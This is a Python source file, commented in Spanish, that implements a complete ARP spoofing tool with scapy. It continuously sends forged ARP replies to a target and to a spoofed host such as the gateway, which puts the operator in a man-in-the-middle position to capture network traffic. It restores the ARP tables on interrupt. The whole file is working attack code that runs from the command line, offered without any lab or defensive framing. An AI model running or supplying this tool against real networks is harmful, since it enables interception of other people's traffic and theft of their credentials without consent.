import scapy.all as scapy
import argparse
from colorama import Fore, Style, init

# Inicializa colorama
init(autoreset=True)

class ArpSpoofer:
    def __init__(self, target_ip, spoof_ip, interface):
        # Constructor de la clase ArpSpoofer. Inicializa las IPs objetivo,
        # la IP que se va a suplantar y la interfaz de red.
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface

    def get_mac(self, ip):
        # Envia una solicitud ARP para obtener la direccion MAC de la IP indicada.
        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        answer = scapy.srp(final_packet, iface=self.interface, timeout=2, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return mac

    def spoof(self, target, spoofed):
        # Suplanta a la maquina objetivo haciendose pasar por la IP indicada.
        mac = self.get_mac(target)
        packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.YELLOW + f"[+] Suplantando {target} haciendose pasar por {spoofed}")

    def restore(self, dest_ip, source_ip):
        # Restaura la tabla ARP del objetivo a su estado original.
        dest_mac = self.get_mac(dest_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.GREEN + f"[+] Restaurando {dest_ip} a su estado original.")

    def run(self):
        # Inicia el proceso enviando paquetes falsificados de forma continua.
        # Restaura las tablas ARP si hay una interrupcion con CTRL+C.
        try:
            while True:
                self.spoof(self.target_ip, self.spoof_ip)  # Suplanta la IP objetivo.
                self.spoof(self.spoof_ip, self.target_ip)  # Suplanta la IP del otro extremo.
        except KeyboardInterrupt:
            print(Fore.RED + "[!] Se detecto CTRL+C. Restaurando tablas ARP... espera un momento.")
            self.restore(self.target_ip, self.spoof_ip)
            self.restore(self.spoof_ip, self.target_ip)
            print(Fore.GREEN + "[+] Tablas ARP restauradas.")

if __name__ == "__main__":
    # Configura argparse para recibir argumentos por linea de comandos.
    parser = argparse.ArgumentParser(description="Herramienta de ARP spoofing para capturar trafico de red.")
    parser.add_argument("-t", "--target", required=True, help="IP objetivo que se va a suplantar.")
    parser.add_argument("-s", "--spoof", required=True, help="IP a suplantar, por ejemplo la del gateway.")
    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red a usar, por ejemplo eth0 o wlan0.")

    # Parsea los argumentos recibidos.
    args = parser.parse_args()

    # Crea el objeto ArpSpoofer e inicia el proceso.
    spoofer = ArpSpoofer(target_ip=args.target, spoof_ip=args.spoof, interface=args.interface)
    spoofer.run()
